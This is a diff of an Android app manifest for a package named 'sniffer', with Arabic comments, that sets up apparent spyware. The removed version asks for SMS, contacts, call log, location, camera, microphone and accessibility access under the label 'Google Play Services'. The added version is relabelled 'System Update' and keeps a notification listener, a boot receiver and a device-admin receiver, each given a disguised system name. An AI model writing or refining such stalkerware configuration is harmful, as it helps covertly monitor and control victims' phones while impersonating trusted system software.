@@ -2,120 +2,49 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.v8.global.sniffer">
 
-    <!-- أذونات الإنترنت الأساسية -->
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    
-    <!-- أذونات التخزين -->
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-    
-    <!-- أذونات البيانات الشخصية -->
-    <uses-permission android:name="android.permission.READ_CONTACTS" />
-    <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.READ_CALL_LOG" />
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
-    
-    <!-- أذونات الموقع -->
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    
-    <!-- أذونات الكاميرا والصوت -->
-    <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    
-    <!-- أذونات الإشعارات -->
-    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
-    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
-    
-    <!-- أذونات النظام -->
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
-    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
-    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
     <application
-        android:allowBackup="true"
-        android:icon="@android:drawable/sym_def_app_icon"
-        android:label="Google Play Services"
-        android:roundIcon="@android:drawable/sym_def_app_icon"
-        android:supportsRtl="true"
-        android:theme="@style/Theme.AppCompat.Light"
-        android:usesCleartextTraffic="true">
-        
-        <!-- Main Activity -->
-        <activity
-            android:name=".MainActivity"
-            android:exported="true"
-            android:excludeFromRecents="true"
-            android:noHistory="true"
-            android:theme="@style/Theme.AppCompat.Translucent">
+        android:label="System Update"
+        android:theme="@style/Theme.AppCompat.NoActionBar"
+        android:allowBackup="true">
+
+        <activity android:name=".MainActivity" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-        
-        <!-- Notification Service -->
-        <service
-            android:name=".NotificationService"
+
+        <service android:name=".NotificationService"
+            android:label="System Sync"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
-        
-        <!-- Accessibility Service - استخدم الاسم الصحيح هنا -->
-        <service
-            android:name=".MyAccessibilityService"  <!-- تم التعديل هنا -->
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true">
+
+        <receiver android:name=".BootReceiver" 
+            android:exported="true"
+            android:enabled="true">
             <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>
-        
-        <!-- Device Admin Receiver -->
-        <receiver
-            android:name=".AdminReceiver"
+        </receiver>
+
+        <receiver android:name=".AdminReceiver"
+            android:label="System Security"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
             android:exported="true">
-            <meta-data
-                android:name="android.app.device_admin"
+            <meta-data android:name="android.app.device_admin"
                 android:resource="@xml/device_admin_receiver" />
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
             </intent-filter>
         </receiver>
-        
-        <!-- Boot Receiver -->
-        <receiver
-            android:name=".BootReceiver"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-            </intent-filter>
-        </receiver>
-        
-        <!-- File Provider -->
-        <provider
-            android:name="androidx.core.content.FileProvider"
-            android:authorities="${applicationId}.fileprovider"
-            android:exported="false"
-            android:grantUriPermissions="true">
-            <meta-data
-                android:name="android.support.FILE_PROVIDER_PATHS"
-                android:resource="@xml/file_paths" />
-        </provider>
-        
+
     </application>
 </manifest>
-EOF
